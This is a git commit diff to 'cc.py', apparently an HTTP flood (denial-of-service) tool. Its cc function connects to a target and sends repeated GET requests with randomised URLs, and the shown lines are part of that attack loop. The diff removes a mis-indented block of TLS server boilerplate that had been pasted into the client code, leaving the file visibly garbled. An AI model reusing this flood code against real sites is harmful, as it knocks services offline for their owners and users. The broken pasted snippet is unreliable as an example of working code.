249a3a5528f25c82c95d5fa0df6b63b4ffd9359a
The Zyrenn <108138548+Zyrenn@users.noreply.github.com>
2023-03-16 14:56:11 +0700

    Add files via upload

--- cc.py
+++ cc.py
@@ -250,13 +250,6 @@ def cc(event,proxy_type):
 			s.settimeout(3)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
-				context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-context.load_cert_chain('/path/to/certchain.pem', '/path/to/private.key')
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
-    sock.bind(('127.0.0.1', 8443))
-    sock.listen(5)
-    with context.wrap_socket(sock, server_side=True) as ssock:
-        conn, addr = ssock.accept()
 			try:
 				for _ in range(100):
 					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
